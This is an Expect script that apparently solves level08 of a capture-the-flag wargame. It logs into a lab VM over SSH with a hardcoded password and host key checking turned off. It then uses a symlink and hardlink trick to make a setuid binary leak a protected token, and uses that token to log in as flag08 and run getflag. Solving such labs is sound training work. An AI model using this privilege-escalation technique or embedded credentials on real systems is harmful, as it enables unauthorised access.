#!/usr/bin/expect -f
set ip 192.168.1.103
spawn ssh -o "StrictHostKeyChecking no" level08@$ip -p 4242 "mkdir -p /tmp/level08 ; cd /tmp/level08 ; rm -rf ./* ; ln -s ~/token token ; ln token hardlink ; ~/level08 hardlink"
expect "sword:"
send "fiumuikeil55xe9cu4dood66h\r"
expect -re "\r\n(.*?)\r\n"
set password $expect_out(1,string)
spawn ssh -o "StrictHostKeyChecking no" flag08@$ip -p 4242 "getflag"
expect "sword:"
send "$password\r"
interact
